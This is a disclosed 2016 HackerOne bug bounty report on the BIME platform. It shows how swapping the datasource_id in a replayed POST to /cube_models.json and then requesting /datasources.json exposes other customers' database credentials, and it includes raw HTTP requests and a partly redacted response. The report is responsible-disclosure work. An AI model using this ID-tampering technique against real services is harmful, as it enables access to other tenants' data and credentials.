# Urgent: attacker can access every data source on Bime

## Report Details
- **Report ID**: 149907
- **URL**: https://hackerone.com/reports/149907
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-07-08T03:53:26.690Z
- **Disclosed**: 2016-07-27T15:00:35.144Z

## Reporter
- **Username**: jobert
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: bime

## Vulnerability Information
# Vulnerability details
I don't include words like "urgent" in my title very often, but I thought you might want to get onto this right away. An attacker can access the data source of any other customer on the BIME platform through the `/cube_models.json` endpoint. This leaks, for example, the login information of Postgres backends (including hostname, login, and passwords). I haven't verified whether the passwords are encrypted, but this seems pretty bad nevertheless.

# Proof of concept
Sign in as a normal user - I used my personal email address on the https://h1-bugbounty.bime.io domain. I added a CSV as data source to set up a new dashboard. During this flow, the following request is sent to the server:

```
POST /cube_models.json HTTP/1.1
Host: h1-bugbounty.bime.io
...

{"import_strategy":"replace","configuration":"{\"bimeDb\":{\"arrayVarcharLength\":500,\"numberOfDecimals\":2},\"queryBlender\":{\"pushdown\":true,\"raiseWarnings\":true},\"infiniteCache\":{},\"timeZone\":\"\",\"mergeFields\":\"\",\"schedule\":{\"cronExp\":\"0 0 0 * * ?\",\"cronText\":\"Every day at 00 : 00\",\"emailOnSuccess\":false,\"emailOnFailure\":false,\"refreshRate\":\"importNow\"},\"bundle\":{},\"sortWeekdayFromMonday\":true}","model_category_id":527921,"name":"CSV Connection 1","cache_type":"dejaVu","use_cache":true,"datasource_id":723592,"technical_type":"filePicker","in_memory_cache_time_to_live":15,"cube_schema":"PE9MQVBTY2hlbWEgZm9sZGVycz0iZXlKaGRIUnlhV0oxZEdWelJtOXNaR1Z5Y3lJNlcxMHNJbTFsWVhOMWNtVnpSbTlzWkdWeWN5STZXMTBzSW0xbFlYTjFjbVZ6Um05c1pHVnljMFJwYzNCc1lYbEdiM0p0WVhSeklqcGJYWDA9IiBsYWJlbD0iY3N2Y29ubmVjdGlvbjEtYmU2ODgiIGlzTGFyZ2VNb2RlbD0iZmFsc2UiIGFycmF5Q29sdW1ucz0iVzEwPSIgPjxEaW1lbnNpb25zPjxEaW1lbnNpb24gbGFiZWw9IkF4aXMgb2YgYW5hbHlzaXMiIGRpc3BsYXlOYW1lPSJBeGlzIG9mIGFuYWx5c2lzIiBpZD0iQXhpcyBvZiBhbmFseXNpcyI+PEF0dHJpYnV0ZXM+PEF0dHJpYnV0ZSBsYWJlbD0iSUQiIGRlc2NyaXB0aW9uPSJJRCIgZGlzcGxheU5hbWU9IklEIiBmb2xkZXJJbmRleD0iMCIgb3JpZ2luYWxEaXNwbGF5TmFtZT0iSUQiIHJlYWxUeXBlPSJtZWFzdXJlIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjxBdHRyaWJ1dGUgbGFiZWw9InRpdGxlIiBkZXNjcmlwdGlvbj0idGl0bGUiIGRpc3BsYXlOYW1lPSJ0aXRsZSIgZm9sZGVySW5kZXg9IjAiIG9yaWdpbmFsRGlzcGxheU5hbWU9InRpdGxlIiByZWFsVHlwZT0iY3VzdG9tIiBjdXN0b209ImUzMD0iIGZvbGRlck5hbWU9IkF4aXMgb2YgYW5hbHlzaXMiIGdlb0xldmVsPSJhdXRvIiAvPjwvQXR0cmlidXRlcz48L0RpbWVuc2lvbj48L0RpbWVuc2lvbnM+PE1lYXN1cmVzIGRpc3BsYXlGb3JtYXQ9InN0YW5kYXJkX1dBQ18wX1dBQ18xMDAwX1dBQ19fV0FDX19XQUNfLl9XQUNfIF9XQUNfMV9XQUNfIj48L01lYXN1cmVzPjxDYWxjdWxhdGVkRmllbGRzPjxDYWxjdWxhdGVkTWVhc3VyZXM+PC9DYWxjdWxhdGVkTWVhc3VyZXM+PENhbGN1bGF0ZWRBdHRyaWJ1dGVzPjwvQ2FsY3VsYXRlZEF0dHJpYnV0ZXM+PC9DYWxjdWxhdGVkRmllbGRzPjwvT0xBUFNjaGVtYT4="}
```

Notice the `datasource_id` in this request. Send this request to the server again, but this time, change the ID to the data source that you want to access. You don't need to know the actual type of the datasource. After this, send a `GET` request to the `/datasources.json` endpoint, like shown below.

```
GET /datasources.json HTTP/1.1
Host: h1-bugbounty.bime.io
...
```

```
HTTP/1.1 200 OK
...

[...
{
  "id": 723591,
  "technical_type": "Relational Databases",
  "external_id": "█████████.db.databaselabs.io",
  "login": "bot",
  "email": null,
  "tocken": "true",
  "url": "█████████",
  "public_key": "customSQL",
  "private_key": "true",
  "extra_param1_name": "dbPort",
  "extra_param1_value": "5432",
  "extra_param2_name": null,
  "extra_param2_value": "postgreSQL",
  "extra_param3_name": null,
  "extra_param3_value": "██████████",
  "created_at": "2016-07-08T03:09:29.000Z",
  "updated_at": "2016-07-08T03:35:36.000Z",
  "datasource_version": 2,
  "configuration": "{\"invalidDateAs\":\"null\",\"meta\":{\"useReusableToken\":true},\"cloudStorage\":{\"bigQuery\":{},\"redshift\":{\"useEscapingV2\":true},\"useEscapingV2\":true},\"sqlServerLocale\":\"english\",\"union\":{},\"useBifeV2\":true,\"sqlVersion\":2,\"joinCulling\":true,\"usePushDown\":true,\"jdbcParameters\":[],\"useCache\":false}",
  "final_type": "postgresql",
  "pwd": "██████████"
},
...]
```

This will give the attacker access to every datasource on the BIME platform. It'll also be reflected on the datasources page, when signed in to the platform:

{F103801}

Let me know if you need more information.

## Attachments
- Screen_Shot_2016-07-07_at_20.39.52.png
